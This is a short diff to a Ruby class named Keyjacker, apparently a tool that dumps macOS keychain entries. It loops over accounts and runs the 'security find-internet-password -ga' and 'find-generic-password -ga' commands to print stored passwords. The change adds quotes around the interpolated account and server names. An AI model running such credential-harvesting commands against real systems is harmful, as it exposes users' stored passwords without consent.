@@ -33,9 +33,9 @@ class Keyjacker
     (1..accounts.count).each do |num|
 
       if accounts[num].has_key?("srvr")
-        cmd = `security find-internet-password -ga #{accounts[num]["acct"]} -s #{accounts[num]["srvr"]} 2>&1`
+        cmd = `security find-internet-password -ga "#{accounts[num]["acct"]}" -s "#{accounts[num]["srvr"]}" 2>&1`
       else
-        cmd = `security find-generic-password -ga #{accounts[num]["acct"]} -s #{accounts[num]["svce"]} 2>&1`
+        cmd = `security find-generic-password -ga "#{accounts[num]["acct"]}" -s "#{accounts[num]["svce"]}" 2>&1`
       end
 
       cmd.split("\n").each do |line|
